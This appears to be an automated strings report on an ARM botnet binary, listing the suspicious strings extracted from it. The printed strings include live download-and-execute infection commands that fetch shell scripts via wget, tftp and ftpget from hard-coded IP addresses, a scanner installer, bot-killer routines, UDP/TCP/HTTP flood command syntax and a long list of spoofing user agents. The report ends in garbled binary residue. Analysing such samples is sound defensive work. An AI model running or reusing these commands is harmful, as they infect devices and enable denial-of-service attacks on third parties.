=============================================================================
========	BINARY ID :01a1a5d41cbe4440cc0d0bb35caac0ee696cb973==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :2033
SUPSCPECTED LINES COUNT :389
SUPSCPECTED STRINGS COUNT (DISTINCT) :30
SUPSCPECTED STRINGS WEIGHT :115
SUSPECT STRING SCORE : [115 / 150] 76%
USER AGENTS STRINGS COUNT :262
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :113
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
nopqrstuvw√ü
/361////////2//////////3/M//////0/////2/21//////////////2////2///1///1//5/////N/////5//////////////////
.//////4/1//////1////1//1////N///////M//21///M////1///////////N//////////N//////////O//////////////////2///1//2///M//////////////22////N//R1//////112//////////12//////1/////1/////////////////////////0/////////2/////1//1//1/////N/////L///3/2///////////////////0//0////
bin*
botnet
swatnet
fucknet
cracknet
weednet
gaynet
queernet
ballnet
unet
cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
telnet
/dev/netslink/
/usr/
/bin/sh
/proc/cpuinfo
PING
Failed opening raw socket.
Invalid flag "%s"
pkill -9 
pkill -9 "
AAAAAAAAnetcore
 cd /var/; rm -rf cuntysshd; wget http://64.137.253.50/cuntysshd || tftp -r cuntysshd -g 64.137.253.50; chmod 777 cuntysshd; ./cuntysshd; rm -rf cuntysshd
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)
Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/
BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)
zspider/0.9-dev http://feedback.redkolibri.com/
Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )
Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)
Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)
TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)
TheSuBot/0.2 (www.thesubot.de)
TheSuBot/0.1 (www.thesubot.de)
FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)
FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)
FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)
FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)
FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)
Mozilla/4.0 (compatible: FDSE robot)
findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)
Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0
Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)
msnbot/1.0 (+http://search.msn.com/msnbot.htm)
msnbot/0.9 (+http://search.msn.com/msnbot.htm)
msnbot/0.11 ( http://search.msn.com/msnbot.htm)
MSNBOT/0.1 (http://search.msn.com/msnbot.htm)
Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)
Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)
NetResearchServer/4.0(loopimprovements.com/robot.html)
NetResearchServer/3.5(loopimprovements.com/robot.html)
NetResearchServer/2.8(loopimprovements.com/robot.html)
NetResearchServer/2.7(loopimprovements.com/robot.html)
NetResearchServer/2.5(loopimprovements.com/robot.html)
Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)
Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET 
Googlebot/2.1 (http://www.googlebot.com/bot.html)
YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)
Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6
MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)
Gigabot/3.0 (http://www.gigablast.com/spider.html)
Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+
Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4
Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36
Rome Client (http://tinyurl.com/64t5n) Ver: 0.9
Googlebot 1.01.003
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)
Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13
Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3
Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1
Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60
Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3
Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25
Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)
Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)
Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)
HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)
Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620
Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)
Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22
Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36
Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c
sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py
INSTALLING PYTHON SCANNER
UPDATING PYTHON SCANNER
killall -9 python;pkill python
STOPPING PYTHON SCANNER
STARTING VOIDS HACKA SCANNA
SCANNER
STOPPING SCANNER
STARTING SCANNER ON -> %s
NETIS
STOPPING NETIS SCANNER
STARTING NETIS SCANNER
COMMENCING BOT KILL ON -> %s
UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>
TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)
HTTP
CNC <target> <port> <time>
STD <target> <port> <time>
KILLATTK
Killed %d.
None Killed.
/proc/net/route
/etc/rc.d/rc.local
fork failed\n
Connected %s:%s
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
/proc/stat
/proc/cpuinfo
processor
/sys/devices/system/cpu
/bin/sh
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
fdopen_pids
libc/sysdeps/linux/arm/vfork.S
getpid.c
fork.c
waitpid.c
kill.c
sigprocmask.c
spec_flags.4860
strstr.c
_string_syserrmsgs.c
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname2.c
hoste.5443
connect.c
socket.c
__malloc_largebin_index
rand.c
random.c
randtbl
random_r.c
random_poly_info
nprocessors_onln
system.c
libc/sysdeps/linux/arm/sigrestorer.S
inet_aton.c
gethostbyname2_r.c
inet_pton4
inet_ntop4
dnslookup.c
get_hosts_byname_r.c
gethostbyname_r.c
gethostname.c
read_etc_hosts_r.c
__read_etc_hosts_r
waitpid
__res_sync
random
connect
GetRandomPublicIP
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
makeRandomStr
NetisScanner
sendHTTP
GetRandomIP
system
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
__GI_srandom_r
kill
__GI_sigprocmask
inet_addr
__GI_gethostname
connectTimeout
__GI_kill
__local_nameserver
gethostbyname2_r
strstr
init_rand
rand
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__libc_system
UpdateBins
__get_hosts_byname_r
botkiller
__GI_inet_pton
gethostbyname
__vfork
knownBots
gethostname
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_gethostbyname2
__GI_strstr
__GI_connect
inet_ntop
gethostbyname2
__GI_inet_aton
__GI_vfork
NetisRanges
__GI_gethostbyname2_r
__GI_inet_addr
__libc_connect
pids
sigprocmask
-√´ÍÄ†ÍÉ°ÈºøÈã•ÏåìÀ†Ëå∞Ïè†ÍÄìÏã°ÍÄø«°Êåê„ì†‡¨ê„ì•·¨∞œ•ÍÄ¥„ì°·¨êœ•ÊÑ∞À†Êå†„ì†‡¨†„ì•·¨†Ôø•»∞ÊÉ¢ÈºØ«•Ïà∞Ëó•-√´ÍÄ†Âì°ÈºøÈã•ÏåìÀ†Ëå∞Ïè†ÍÄìÏã°ÍÄø«°Êåê„É†‡¨ê„É•·¨∞œ•ÍÄ¥„É°·¨êœ•ÊÑ∞À†Êå†„É†‡¨†„É•·¨†Ôø•»∞·ì¢ÈºØÀ•Ïà∞Áã•-√´ÍÄ†
